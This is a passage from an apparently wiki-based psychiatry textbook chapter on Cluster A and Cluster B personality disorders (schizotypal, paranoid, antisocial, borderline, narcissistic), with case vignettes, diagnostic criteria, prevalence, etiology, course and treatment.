As patients with SPD have few complaints and do not seek an interpersonal context for solving their problems, they rarely seek therapy. The disorder is most likely to come to medical attention in the course of intervention for another condition, in response to acute stressors or because of family influence. Others who come into treatment are forced to do so by family or even the legal system. Acutely stressful situations often require crisis intervention. Aims of long-term psychotherapeutic interventions are to maintain stability and support, to improve social skills and comfort, to help maximize quality of an isolated lifestyle. 
In treatment, clients with SPD challenge service providers with the absence of response. As they do not response to emotional leverage, therapists easily feel frustrated and ineffective. The contact between therapist and patient should be an important element of the therapy. An important step of the therapy should be to open possibilities to make new experiences and changes (Saß and Jünemann, 2001). The therapist should be aware that major changes and modifications of character structure are unlikely. The therapy should be aimed at achieving modest reductions in social isolation and in prompting more effective adjustment to new circumstances (Kalus et al. in Livesley, 1995). 
Behavioural psychotherapy can be helpful for some patients including, for example, methods such as problem solving, social skills training or role plays. Educational strategies may be effective in working with individuals with SPD to identify (1) their own emotions; (2) the emotions they elicit in others; and (3) possible feeling states of people with whom they relate. Intervention with individuals with SPD may include methods of cognitive therapy, e.g., exploring their self-concept and sense of where they belong in the world. Confrontation should clarify the relation of emotions to thinking and encourage these clients to be present with reality. Individual psychoanalytically oriented psychotherapies are less likely to succeed (Kalus et al. in Livesley, 1995, p.66). Most psychopharmacological interventions apply to comorbid disorders such as depression or anxiousness.

=====Schizotypal Personality Disorder=====
(partly adopted from Svenn Torgersen)

'''Case vignette'''
	
A 37 year old, unemployed man claimed of recurrent irrational thoughts, compulsive behaviour, and social isolation. Since his childhood he had always been eccentric, withdrawn with no real friends anxiously fearing closer relationships, preoccupied with reading stories about Dracula and other myths. He didn’t share his inner thoughts or feeling with anybody, including his parents. He never finished an education, but worked in factories, often at night. Some years earlier he started doubting if his work was accurate enough. Although he recognized these thoughts as irrational, he started spending a lot of time controlling his work over and over again. Soon these compulsive controls took so much time that he could not finish his work, was continuously annoyed by intrusive vivid homosexual images, was preoccupied with doubts concerning almost everything at home and also he had to look persistently at people in order to be sure to maintain their images in his memory. He started fearing that people could notice his behaviour, and he felt that unknown people were staring at him and that they secretly were making fun of him. He complained of being unable to reveal his feelings and thoughts to other people and felt isolated. He started drinking alcohol to control his increasing anxiety. He adopted different peculiar strategies, which ended in new vicious circles of obsessive symptoms and suspiciousness. 
     
This case is diagnosed with obsessive-compulsive disorder (OCD), Alcohol abuse and Schizotypal Personality Disorder. He had long lasting personality difficulties like suspiciousness, odd behaviour and  social anxiety prior to the OCD symptoms. Comorbidity is often seen in Schizotypal Disorder, and it is the axis I disorders that usually brings the patients to treatment.

'''Clinical description'''

The historical roots of schizotypal personality disorder (STPD) are the non-psychotic personality syndromes within the spectrum of schizophrenia. 

The definition of schizotypal personality disorder has remained more or less the same during the revisions of DSM and consists in DSM-IV  of the following criteria:

(1) ideas of reference (excluding delusions of reference),  (2) odd beliefs and magical thinking that influences behaviour and is inconsistent with subcultural norms (e.g., superstitiousness, belief in clairvoyance, telepathy, or &quot;sixth sense;&quot; in children and adolescents, bizarre fantasies or preoccupations),  (3) unusual perceptual experience, including bodily illusions, (4) odd thinking and speech (e.g., vague, circumstantial, metaphorical, over elaborate, or stereotyped), (5) suspiciousness or paranoid ideation, (6) inappropriate or constricted affects, (7) behaviour or appearance that is odd, eccentric, or peculiar, (8) lack of close friends or confidants other than first-degree relatives, (9) excessive social anxiety that does not diminish with familiarity and tends to be associated with paranoid fears rather than negative judgment about self.

ICD-10 included schizotypal disorder among the psychoses and defined it partly similarly, partly differently from DSM. The only difference between DSM-IV and ICD-10 is that DSM-IV includes &quot;ideas of reference&quot; and &quot;excessive social anxiety,&quot; while ICD-10 includes obsessive rumination and micropsychoses. However, ideas of reference are close to suspiciousness, and micropsychoses are close to unusual perceptual experiences, so the only real difference is social anxiety and obsessive ruminations.

'''Differential diagnosis'''

As evolving from the spectrum of schizophrenia, the boundaries between schizotypal personality disorder and schizophrenia are not easy to define. The prodromal symptoms of schizophrenia are similar to the schizotypal personality disorder. Thus, retrospectively, &quot;premorbid&quot; may be added to STPD, according to DSM-IV. When fully developed hallucinations and delusions are presented during a one -month period, the diagnosis is schizophrenia. However, a person with delusions or hallucinations plus negative symptoms may show a clinical picture similar to STPD; even so schizophrenia is the correct diagnosis, if the duration requirements are fulfilled. Even more difficult is the differentiation between simple schizophrenia and STPD in ICD-10. In practice, the differentiation is impossible, as the criteria for simple schizophrenia, personality changes, negative symptoms: and reduced social function is indistinguishable from the early developmental phase of STPD. However, simple schizophrenia requires change, while STPD implies no clear starting point.

The possible early start of STPD, however, may make it difficult to distinguish STPD from milder forms of pervasive developmental disorders (autism). As to other psychotic disorders, the manifestation of full-blown delusions (not only ideas of reference and suspiciousness) and hallucinations (not only illusions) preclude any diagnosis of STPD.

The boundaries between STPD and borderline personality disorder are of course difficult to draw, as both personality disorders emerged from the same borderline psychoses concept. They share the pseudo-psychotic and paranoid features, and quite a few people may live an unstable and turbulent life similar to those with borderline personality disorder. Even so, the impulsivity and affective intensity and variability in the borderline personality disorder are not part of the STPD criteria set. Furthermore, those with borderline personality disorder are not expected to display the socially inept and chronically withdrawn pattern of STPD. Instead, some people with borderline personality disorder may withdraw when they get older, as a consequence of using up the patience of their acquaintances and having experienced a brimful of disappointments in their partnerships and relationships.

STPD is close to schizoid personality disorders. The two disorders share the social isolation and the constricted affects. However, STPD has the oddness and the pseudo-psychotic features in addition. In the same vein, those with paranoid personality disorder share the paranoid features with STPD, but not the withdrawal, oddness and pseudo-psychotic features. STPD shares the social anxiety and the tendency to withdrawal with avoidant personality disorder, but not the eccentricity, paranoid features and illusions.

'''Comorbidity''' 

Avoidant, paranoid and borderline personality disorders were especially highly correlated to STPD.  STPD is associated with psychotic disorders including schizophrenia . Furthermore, there seems to be an association with obsessive compulsive and phobic disorders.  There may also be an association with dysthymic disorder, panic disorder, somatoform disorders and eating disorders.

'''Prevalence''' 

Relatively few studies of the prevalence in the general population have been performed. The samples are seldom quite representative, and differently structured interviews are applied, based on different editions of DSM. The most representative studies show a prevalence of 0.7 (Maier et al. 1992) and 0.6 (Torgersen et al. 2001). Those with a higher number of schizotypal traits have less education and  more often live alone in the city centre compared with those with a lower number. STPD seems thus more prevalent among men in clinical samples.

'''Diagnostic assessment'''

A meta-analysis of the so-called &quot;Big-Five&quot; and personality disorders showed that what characterized those with STPD were first and foremost Neuroticism, second Introversion and third Non-Agreeableness. The pattern was similar to paranoid and borderline personality disorders in Neuroticism and Non-agreeableness, and similar to avoidant personality disorder in Neuroticism and Introversion. Furthermore, STPD was similar to schizoid personality disorder in Introversion, to antisocial and narcissistic personality disorders in Non-agreeableness, and to dependent personality disorder in Neuroticism. There were no similarities to histrionic and obsessive-compulsive personality disorders. Together with borderline personality disorder, those with STPD were extreme on most personality disorders, three out of five dimensions.

The results of the studies of the relationships between STPD and personality dimensions fit in with the large overlap between STPD and paranoid, avoidant and borderline personality disorders. A study of the relationships between personality disorders and Cloninger’s temperament and character scales suggests that STPD is negatively correlated to Self-directedness and Cooperation, and positively correlated to Self-transcendence. The results illustrate the vulnerable, withdrawn and psychotic-like aspects of STPD. Even if STPD is correlated to common personality dimensions one cannot jump to the conclusion that STPD is a construct based on these dimensions. It may be that those with schizotypal traits simply answer in an extreme way when these dimensions are measured by the questionnaires. 

Then we approach the question about the categorical or dimensional nature of schizotypal features. Some statistical analyses suggest that that a latent discontinuity underlies the variation in schizotypal traits (Lenzenweger &amp; Korfine, 1995). Others believe more in a dimensional model of schizotypy, with poorly functional individuals at one end of the dimensions, and well-functioning individuals among those with somewhat lower scores on schizotypal inventories (Goulding, 2004). Those more poorly functioning are more anhedonic and with more cognitive disturbance, while those well-functioning are more characterized by unreal experiences.

'''Etiology'''

STPD is genetically influenced as are other personality disorders (Torgersen 1986; Torgersen et al. 2000; Kendler &amp; Hewitt, 1992). This is also the case for schizotypal traits in children (Coolidge et al. 2001). However, what is especially important is the genetic relationship to other mental disorders. Some studies suggest a familial relationship between STPD and the whole realm of psychoses (Squires-Wheeler et al. 1989; Kendler et al. 1995). As STPD evolved out of the familial schizophrenic spectrum, the genetic relationship to schizophrenia is of particular interest. Studies of co-twins of schizophrenic patients (Torgersen, 1992), and biological relatives of adopted-away schizophrenics (Kendler &amp; Gruenberg, 1984) confirmed the specific familial and genetic relationship between STPD and schizophrenia. No other personality disorders seem to be consistently related to schizophrenia.

However, STPD as defined by DSM does not seem to cover adequately the schizophrenia-related STPD. Those adopted-away offspring of schizophrenics who develop personality disorders seem to experience frequent somatoform complaints and poor social function in addition to withdrawal and emotional constriction (Gunderson et al. 1983). In fact, STPD consists of two syndromes that may be independently inherited (Siever, 1995; Kendler and Hewitt, 1992), a constricted/eccentric syndrome that is characterized by odd and eccentric appearance and behaviour, thoughts and communication, and a psychotic-like syndrome that is characterized by ideas of reference, magical thinking, illusions and depersonalization/derealization. While the former syndrome seems to be genetically related to schizophrenia (Torgersen, 1993), the latter is not.  Even if there might exist a familial relationship between STPD and affective disorder, a genetic relationship to major depression is not confirmed.

We do not know what environmental factors influence the development of STPD. A retrospective study showed that those with STPD more often reported neglectful parenting from both parents, which means little love and also little control (Torgersen &amp; Alnæs, 1992). Those with borderline personality disorder more often reported affectionless control, meaning little love and much control. Those with other personality disorders more often experienced affectionate constraint; much love and much control, while those without personality disorder reported optimal parenting; much love and little control.

'''Course and prognosis'''

A Norwegian twin study showed that those with STPD had poor social as well as occupational adjustment (Torgersen, 1986). Skodol et al. (2002) found dysfunction in relation to parents, sibs, and friends, occupational dysfunction, and dysfunction in relation to more distant family members among those with schizotypal personality disorder. Quality of life is also reduced among those with STPD (Cramer et al. 2003). They have a poor subjective well-being, poor self-realization, less contact with friends and family, less social support, a lot of negative life events, poor neighbourhood quality, and generally a poorer global quality than those without STPD in the general population. Among the personality disorders, nobody displayed poorer quality of life than those with STPD.

The neuropsychological and biological fundamentals of STPD are far from settled. Even so, some results are forthcoming. There seems to be a difference between the constricted/ eccentric and the psychotic-like STPD syndromes. Neuro-psychological tests measuring attention and information processing observe impairment among those with constricted/eccentric traits (Siever, 1995). Indication of a low dopamine level are found among those with the constricted/eccentric syndrome, for instance by a low concentration of homovannilic acid (HVA). An adequate dopamine activity is necessary for maintenance of working memory, a function necessary for social engagement as well as other executive functions.

The deficient information processing may contribute to the social withdrawal, emotional constriction and eccentricity among those with STPD. On the other hand, those with the psychotic-like syndrome seem to have an exceptionally high level of dopamine-activity, as also demonstrated in a high concentration of HVA. The increased dopaminergic activity may explain the psychotic-like traits such as illusions, paranoid ideations etc.

'''Treatment'''

Usually psychotherapeutic approaches are applied for patients with STPD. No controlled results are published. However, from clinical experience there are some precautions that are important to take into account. Some less experienced clinicians may be fascinated with all the grotesque and symbol-rich material patients with STPD may produce. They show interest, ask for details and encourage the patient to tell more. This can be great for the clinician, but hardly helpful for the patient. The patient may slide even more into the disturbing inner fantasies. A better approach is to dedramatize the strange thoughts and pictures, not reject, if the patient is active in telling, not refrain from showing a strong interest in the material. Instead, it is important for the patient to learn social skills, to discuss what went wrong in interpersonal situations, what behaviour is common and appropriate.

As to pharmacotherapy, the best approach is to treat the axis-I disorder in cases where those with STPD have it in addition. If the clinical picture is dominated by psychotic-like features, neuroleptic may be the treatment of choice. There are some indications that blocking of dopaminergic activation may help those with psychotic-like traits. On the other hand, those with constricted/eccentric features may be helped by drugs that functions like amphetamine - releasing dopamine and blocking its reuptake.

=====Paranoid Personality Disorder=====
(partly adopted from Elizabeth Iskander &amp; Larry J. Siever)

'''Case vignette'''  

A 36 year old divorced worker developed a severe depression after he was fired from his job and subsequently had severe alcohol problems. He presented himself to the general practitioner with somatic complaints, anxiety, compulsively washing his hands, fatigue, disturbing inner feelings of hatred towards other people. His troubles started in his childhood. He reported that he was very aggressive towards other children and he was involved in recurrent conflicts. At home he was constantly on guard. In his work relations he was involved in severe interpersonal conflicts, reacting with aggressive attacks at the slightest offences. The last years he spent working, he was continuously involved in conflicts with his colleagues. After a short contact with a female colleague who terminated the relationship with him. The only person he stayed friends with was his brother-in-law who lived a hundred kilometres away.
This vignette illustrates important issues and characteristic features of the paranoid personality. First, they do not seek treatment unless they are in a crisis (fired from job) or because of additional pathology (depression). Second, when decompensated they most often get depression, panic attacks, OCD, somatoform disorder as in this case or in other cases an additional alcohol abuse. Third, the vignette may support a psychodynamic formulation of key elements in his personality functioning. His personality pathology is excessive aggression and mistrust.

		schizophrenia (F20. - )


Paranoid personality disorder is a clinically well-recognized disorder that has not, however, been the object of a great deal of investigation. Although noted in the writings of psychiatrists since the late 1800's, the condition was first called &quot;paranoid personality&quot; by Kraepelin in 1921 (Akhtar, 1990). 

The hallmark criteria regarding paranoid personality disorder (PPD) are distrust and suspiciousness of others such that others are seen as purposefully attempting to harm one in some way without any evidence to suggest this is the case. Those with paranoid personality disorder also may be very critical of others, argumentative and rigid in beliefs, again stemming from harbouring unwarranted suspicions about people around them. This often leads to problems with relationships, both personal and in the work place. 

The ICD-10 lists seven criteria (see above) of which only three must be met. The current criteria for diagnosing paranoid personality disorder in DSM IV-TR includes seven symptoms of which at least four must be met. Most are essentially the same as the ICD criteria. These include suspicion that others are harming or deceiving one in some way, preoccupation with doubts about the loyalty of friends, reluctance to confide in others out of fear that information may be used against them, reading threatening meaning into benign events, bearing grudges over insults or slights, hasty and angry reaction to perceived attacks on character, and unjustified suspicion regarding the fidelity of a spouse or partner.

There is one criterion that does not exist in the DSM IV and that is &quot;tendency to experience excessive self-importance, manifest in a persistent self-referential attitude.&quot;  This item, basically implying a level of grandiosity, also did not exist in the DSM III or III-R versions.

'''Differential diagnosis'''

Paranoid personality disorder must be diagnosed to the exclusion of schizophrenia, or any other psychotic disorder including psychosis in the context of a mood disorder. Paranoid personality disorder is considered &quot;premorbid&quot; if it is present prior to an Axis I psychotic disorder.

'''Comorbidity''' 

There is substantial comorbidity of Axis I disorders; individuals with paranoid personality disorder appear to have an increased likelihood of developing depression, agoraphobia, obsessive compulsive disorder and alcohol or substance abuse or dependence. With regard to comorbid personality disorders, there is some variation in the literature. Generally though, it has been suggested that in clinically based samples, over 75% of patients who met paranoid personality disorder criteria also met criteria for other personality disorders, the most common were found to be schizotypal and narcissistic. 

One area of research is the possible relationship of PTSD with paranoid personality disorder. When 180 outpatients were analyzed using the DSM III-R, subjects with paranoid personality disorder had a higher rate of comorbid PTSD than subjects without the disorder (29% compared with 12%) (Golier et al. 2003). In addition, they had elevated rates of physical abuse and assault in childhood and adulthood (54% compared with 35%). This suggests a possible link between trauma during early events in life and subsequent paranoid behaviour and mistrust.

Another area that has received some attention is the relationship of violence to paranoid personality disorder. Paranoid cognitive personality style was found to increase the risk of violence in subjects with personality disorders, particularly schizophrenia spectrum disorders (Nestor, 2002).

;Prevalence

According to the DSM-IV, the prevalence of paranoid personality disorder was 0.5 to 2.5% in the general public, and more common in males. Interestingly, the 1997 National Survey of Mental Health and Wellbeing (conducted in Australia) using the ICD-10 to assess personality disorders found a 1.34 % prevalence of paranoid personality disorder and no sex difference, despite the similarities in criteria between the DSM and the ICD. 

There is some current evidence that paranoid personality disorder may be more difficult to diagnose than other personality disorders. A study of interrater reliability using DSM IV achieved good agreement. However, in the same study, when analyzing test-retest reliability based on how consistent a patient’s report is from one clinician to another, and how information is interpreted and scored, paranoid personality disorder had the lowest reliability of all the personality disorders (Zanarini et al. 2000). 

;Etiology

It has been suggested that paranoid personality disorder may be related to certain Axis I disorders, including schizophrenia and delusional disorder. Kendler found a much higher risk of paranoid personality disorder in first degree relatives of those with delusional disorder as opposed to relatives of those with schizophrenia, 4.8% compared to 0.8% (Kendler et al. 1985). 

On the other hand, paranoid personality disorder was significantly more common in the biologic relatives of patients with schizophrenia when compared with relatives of controls (Kendler et al. 1982). 

Using data from the Roscommon family study, an epidemiologic study conducted in Ireland, it was discovered that biological relatives of those with schizophrenia had a significantly higher amount of paranoid personality disorder compared with relatives of controls (Kendler et al. 1993).

As with other disorders, cultural factors must be taken into account in diagnosing this disorder. There are some groups that might, for reasons of maltreatment, language barriers, and unfamiliarity to this society, display what could be labelled paranoid traits. Those groups include: minority groups, immigrants and refugees. In an epidemiologic study recently completed on personality disorders, minorities such as blacks, Hispanics and Native Americans were at greater risk for having paranoid personality disorder than whites (Grant et al. 2004). Also according to the same study, paranoid personality disorder was more common among younger people (18-29), those with lower incomes, and those who were divorced or never married. Some of these findings are not surprising, taking into account the nature of paranoid personality disorder. However, this does bring up the question of which came first: Are some paranoid traits the result of maltreatment by others due to socioeconomic status, race, etc., or does the disorder contribute to, for example, inability to succeed professionally or remain in a relationship? There appears to be a combination of both, which can contribute to complications in diagnosing the disorder.

;Course and Prognosis

Paranoid personality disorder can be noted first in childhood; symptoms observed include solitariness, social anxiety and odd thoughts and language. There is not a lot of data regarding the course and prognosis of the disorder. This is likely due to the fact that as it is a personality disorder, it tends to be stable over adult life and although it can cause interpersonal problems, does not often require treatment. It has been observed that the course of the disorder rarely worsens or goes into remission (Akhtar, 1990). 

;Treatment

There is no specific treatment or medication for paranoid personality disorder. When existing in conjunction with other personality disorders, i.e., borderline personality disorder, treatment may be sought but that is primarily due to symptoms experienced in other personality disorders. There is some data on the effectiveness of day treatments for patients with personality disorders in general (Karterud et al. 2003). Treatment results, although effective for some personality disorders (i.e., borderline), were the poorest for those with paranoid, schizoid, and schizotypal personality disorders.

==== Cluster B ====

Cluster B includes four personality disorders: Antisocial (ASPD), Borderline (BPD),  Histrionic (HPD) and Narcissistic (NPD).  According to DSM IV-TR individuals with these disorders appear dramatic, emotional or erratic.

;Case vignette 
This is a 27 year old male who committed murder at age 17. He stayed in a high-security hospital for 10 years and started individual treatment after being released. He was an intelligent boy who did well in school until his peers began to tease him. This made him feel helpless and unable to defend himself.  At home, however, he felt strong and supportive of his mother. His father lived with another woman. He experienced him self as a looser among his pears but as a winner with his mother. At the end of primary school his father, who then had accumulated substantial wealth, returned home, and the parents resumed their marriage and intimacy.  His situation at school changed as he became popular and the teasing stopped, but he still felt insecure and uneasy. He decided to attend karate school to gain a sense of power. A peer introduced him to the criminal milieu where he felt accepted and appreciated.  During a robbery he became incredible angry and physically violent without really understanding why. The victim died as a consequence of his attack. He was send to prison for 2 years, followed by a high security hospital for treatment.  While he accepted his prison sentence he protested treatment in psychiatric hospital. He was suspicious, remained non-relative and was often restrained due to anger outbursts.  A therapist confronted him with the fact that his behaviour could lead to prolonged hospital stay and pointed to his choice of future inside or outside the hospital. This was turning point that made him focus on goals and training for a future out in real life. After discharge he continued to work on self-esteem and trustworthiness, shame and guilt and how to understand, control and come to terms with his anger. Two years later he was married with a son, and pursued a career as a teacher.  

;Clinical description 

Diagnostic Criteria ICD-10

F60.2	Dissocial personality disorder

Personality disorder, usually coming to attention because of a gross disparity between behaviour and the prevailing social norms, and characterized by:

(a) callous unconcern for the feelings of others;

(b) gross and persistent attitude of irresponsibility and disregard for social norms, rules and obligations;

(c) incapacity to maintain enduring relationships, though having no difficulty in establishing them;

(d) very low tolerance to frustration and a low threshold for discharge of aggression, including violence;

(e) incapacity to experience guilt or to profit from experience, particularly punishment;

(f) marked proneness to blame others, or to offer plausible rationalizations, for the behaviour that has brought the patient into conflict with society.

There may also be persistent irritability as an associated feature. Conduct disorder during childhood and adolescence, though not invariably present, may further support the diagnosis.

Includes: 	amoral, antisocial, asocial, psychopathic, and sociopathic personality (disorder)

Excludes: 	conduct disorders (F91. - )
			emotionally unstable personality disorder (F60.3)

People with ASPD (Dissocial in ICD 10) show unreliability, recklessness, restlessness, disruptiveness, and aggressiveness.  According to DSM IV-TR (2000) they have a pervasive pattern of disregard for, and violation of, the rights of others. Negative symptoms include lack of anxiety and remorse, and lack of emotional depth and stability.  They are interpersonally detached, suspicious, and exploitative, and they lack commitment to and concern for others. Antagonism, deceitfulness, manipulativeness, dishonesty, and glibness are typical interpersonal features. Some come across as self-aggrandizing and self-justifying with a sense of entitlement and invulnerability. Cognitive deficits include inflexibility, and lack of concentration.  

;Prevalence

The lifetime prevalence of ASPD is about 2-3 % in the general population. The rate in the community and psychiatric population is relatively low (1-2%),  but among correctional offenders, forensic psychiatric patients, and substance users it is high (&lt; 50%).   

;Etiology 

Theoretical models for the etiology of ASPD suggest a mental abnormality with social and biological causal factors, and have excluded child rearing experiences, familial dysfunctions, or adverse life experiences. Sociocultural  and neurological factors are associated with symptoms of ASPD, but not clearly pathognomonic.  Other theories consider ASPD as an extreme variant of personality traits found in all people, or as an adaptation. Early manifestations of ASPD are evident in children (age 6-10 years), and it is common that  adults with ASPD in their childhood or adolescence were diagnosed with conduct disorder, oppositional defiant disorder, or attention deficit hyperactivity disorder. 

;Course

Symptoms of ASPD can persist into middle or late adulthood. ASPD has been associated with increased rate of morbidity and mortality. 

;Comorbidity

Antisocial personality disorder is often comorbid with substance-use disorders,  but also  with other personality disorders,  such as the Cluster B  borderline, narcissistic, and histrionic in DSM-IV or emotionally unstable and histrionic in ICD-10. 

;Treatment 

There is no good evidence that ASPD can be successfully treated. Most treatment studies have aimed at reducing criminal behaviour in mixed groups of patients or offenders, including some with ASPD,  rather than attempting to alleviate symptoms of ASPD. Nevertheless, structured psychosocial treatments that focus on the acquisition of important life skills, such as communication, assertiveness, and anger management skills are useful (Hemphill &amp; Hart, 2002). Pharmacological treatments that target treatment-interfering symptoms, such as extreme hostility or impulsivity, may play a useful adjunctive role in certain cases.

===== Borderline personality disorder =====

(adopted from Anthony Bateman &amp; Peter Fonagy)

;Case vignette 
A 23 years old woman reacted with depressive symptoms and suicidal thoughts to the death of her grandfather. She was treated with antidepressant medication without addressing the loss. Three years later after a suicidal attempt, she was admitted to hospital where she first presented with depressed mood and suicidal thoughts, but quickly engaged in vivid conversations with the others patients.  She was discharged with the diagnosis of personality disorder, but soon re-admitted because of suicidal thoughts, and referred to an outpatient program specialized on treatment of personality disorder. Since childhood she had unstable mood, aggressive temperament and self-destructive behaviour (head banging).  At the age of 10 she was sexually abused by an older man.  Suicidal thoughts and urges to kill herself was first experienced at age 11. Since age 13 she has had multiple sexual partners but also one 7 year long relationship which was quite unstable with frequent conflicts and impulsive acts.   She dropped  out of school and has been living on sickness benefits, interrupted by short periods of unskilled employment. In a two year psychoanalytic treatment program with one individual session and one group session a week in addition to psycho education, she worked together with other patients on identifying and understanding the characteristic features of BPD, and the dynamics of borderline pathology with a special focus on self-destructive behaviour. Her self-destructive behaviour tapered off after 3 months as she began to process her feelings of aggression and sadness. The pharmacological treatment terminated after 6 months and she quickly became less sedated and anxious. She resumed school towards the end of the first year of treatment, with the intention of taking a degree in teaching. The relationship with her boyfriend stabilized. Contacts with class became more satisfying, and conflicts with her teachers stopped. Her ability to begin to contain feelings increased dramatically. 

;Clinical Description

Diagnostic Criteria ICD-10

F60.3	Emotionally unstable personality disorder

A personality disorder in which there is a marked tendency to act impulsively without consideration of the consequences, together with affective instability. The ability to plan ahead may be minimal, and outbursts of intense anger may often lead to violence or &quot;behavioural explosions&quot;; these are easily precipitated when impulsive acts are criticized or thwarted by others. Two variants of this personality disorder are specified, and both share this general theme of impulsiveness and lack of self-control.

*F60.30 Impulsive type

The predominant characteristics are emotional instability and lack of impulse control. Outbursts of violence or threatening behaviour are common, particularly in response to criticism by others.

lncludes: 	explosive and aggressive personality (disorder)
Excludes: 	dissocial personality disorder (F60.2)

*F60.31 Borderline type

Several of the characteristics of emotional instability are present; in addition, the patient's own self-image, aims, and internal preferences (including sexual) are often unclear or disturbed. There are usually chronic feelings of emptiness. A liability to become involved in intense and unstable relations hip s may cause repeated emotional crises and may be associated with excessive efforts to avoid abandonment and a series of suicidal threats or acts of self-harm (although these may occur without obvious precipitants)

lncludes: 	borderline personality (disorder)

Individuals with BPD (Emotionally unstable in ICD 10) have according to DSM IV-TR (2000) a pervasive pattern of instability in interpersonal relationships, self-image and affects, and marked impulsivity.  They show frantic efforts to avoid real or imagined abandonment, a pattern of unstable and intense interpersonal relationships and identity disturbance. They also present with  impulsivity, recurrent suicidal gestures, affective instability, chronic feelings of emptiness, inappropriate intense anger. In severe cases transient stress-related paranoid ideation or severe dissociative symptoms are noticeable. 

;Prevalence

BPD is relatively rare in the general population (0.2%- 1.8%) while prevalence rate among psychiatric inpatient and outpatient is higher (15% – 25%). 

;Etiology  

Early separations and losses, disturbed parental involvement with conflictual relationships,  childhood history  of physical and/or sexual abuse, and high prevalence of affective disorder in first-degree relatives of borderline probands are specific developmental and psychosocial factors  for BPD (Zanarini &amp; Frankenburg, 1997).  Low level of serotonin, stress sensitivity and a tendency for impulsive aggression can, when combined with psychosocial factors, contribute to adult BPD.  

;Course

Although borderline patients improve over time they still can remain functionally impaired.  Especially those who experienced sexual abuse or incest in childhood have a poor prognosis.  Emotional instability,  impulsivity and aggressive relationships  worsen prognosis  as do co-morbid substance abuse,  and schizotypal, antisocial or paranoid features.

;Comorbidity

Around 60% of patients with BPD have major depressive disorder,  30% panic disorder with agoraphobia, 12% substance use disorder,  10% bipolar-I,  and 4% bipolar-II disorder. Comorbid BPD tends to interfere with treatment of Axis I.  

;Treatment  

Multimodal treatment and a combination of psychotherapy and psychopharmacological treatment offer the best chance of a good outcome (Oldham, Phillips, Gabbard, et al. 2001).  Psychodynamic treatment is preferable while long in-patient treatment has proved ineffective. Evidence based manualized treatment modalities, i.e.,  Mentalization Based Treatment (Bateman &amp; Fonagy, 1999; Bateman &amp; Fonagy, 2001),  Cognitive therapy (Ryle, 1997), Dialectic Behaviour Therapy (DBT) (Lenihan 1993; Linehan Heard, Armstrong, 1993) and Transference Focused Psychotherapy (TFP) (Clarkin, Foelsch, Levy, et al., 2001),  have all proved beneficial and effective in changing borderline symptoms and character functioning. Although no specific psychotropic drug is effective for BPD, some can help reducing disabling symptoms; i.e., typical and atypical antipsychotic drugs, tricyclic antidepressants (TCA’s) and selective serotonin reuptake inhibitors (SSRI’s), monoamine oxidase inhibitors (MAOI’s),  and mood stabilisers.  

===== Narcissistic personality disorder =====

;Case vignette  

A 42-year-old male professional in public office, was forced to resign after being arrested when visiting a brothel.  In the aftermath he suffered from depression and considerable alcohol consumption, and was admitted for a three months treatment. He stopped drinking, but his depression remained nonresponsive to anti-depressant medication. Still without meaningful activities he felt empty and restless, and he was referred to psychotherapy. Developmental history indicates that at age 5 his father left the family, and they did not meet until he was in law school. He was always ahead of his age and went through school without difficulty. In law school he got high marks without hard work. He had many acquaintances but no friends, and he felt like an outsider. He got married and had two children. Reaching mid-thirties he felt bored.  He had everything: house, career, and family. He was respected and accomplished, but felt he didn’t belong. He started drinking heavily and visiting brothels. The psychotherapist found him self-assured, easily irritated, and quick to make devaluating remarks, and felt a mixture of irritation, compassion and powerlessness.  Interactions during weekly appointments were extremely difficult. Unwilling to explore his situation or his feelings, he blamed the therapist for the impasse and told him that he will not change and that the therapist could not help. The therapist dreaded the appointments, while the patient despite finding the sessions unhelpful, always showed up.  When the therapist announced a three weeks break his patient suggested the treatment to end and did not return.   Nine months later he informed the therapist that he moved to another city, had a leading position working with international trade, and was greeted as a king.  He said nothing about his wife and children. Nor did he indicate how he felt about the treatment.  

;Clinical Description

People with NPD (not included in the ICD 10) have a grandiose sense of self-importance and accompanying grandiose fantasies. According to DSM-IV TR (2000)  they present a pervasive pattern of grandiosity, need for admiration and lack of empathy.  In addition they have a sense of entitlement and tendencies to be exploitive, and take advantage of other people. They can come across as arrogant and haughty or boastful and self-centered. However, they also have vulnerable and fluctuating self-esteem, feelings of shame, intense reactions to criticism or defeat, and vocational irregularities. Some may appear more sensitive, inhibited, vulnerable, shame-ridden and socially withdrawn, and others can present with psychopathic or antisocial characteristics.  

;Prevalence

Variable prevalence rate of NPD has been found both in the general community (1% - 6%) (Stinson, Dawson Goldstein et al 2008) and in the clinical population (1.3% - 17%).     

;Etiology  

Studies have suggested a genetic influence on the development of NPD, including  hypersensitivity, strong aggressive drive, low anxiety or frustration tolerance, and defects in affect regulation (Torgersen et al 2000; Schore, 1994). Inconsistent attunement and insufficient attachment in the early parent-child interaction can lead to failure in the development of self-esteem and affect regulation. 

;Course and prognosis

Although narcissistic traits can be frequent in adolescence, NPD develop in adulthood and can persist into old age. Severe disability has been indicated especially among those with comorbid Axis I disorder. NPD patients with ability for object relations actually improve over time and may have better prognosis (Ronningstam, Gunderson, Lyons 1995).
 
;Comorbidity

NPD is considered to have one of the highest rates of diagnostic overlap among the Axis II disorders, especially with ASPD (25%).  Major depression and dysthymia are the most common concomitant Axis I disorders (42 - 50%), followed by substance use disorder (24 – 50%) and bipolar disorder (5 – 11 %).  Co-occurring narcissistic features can worsen course and prognosis for Axis I disorders.  

;Treatment

Psychoanalysis and psychoanalytically oriented psychotherapy are the most common treatment for NPD (Kernberg, 1975; Kohut, 1968;  Fiscalini, 1994).  Additional modalities include the Schema Focused  Therapy (Young &amp; Flanagan, 1998), and couples or family therapy (Solomon, 1998; Kirshner, 2001). Potentially beneficial psychopharmacological treatment focused on mood, anger or anxiety, is often challenged by the patients’ reluctance to adhere to such modality. 

===== Histrionic Personality Disorder =====

(adopted from Bruce Pfohl)

;Case vignette  

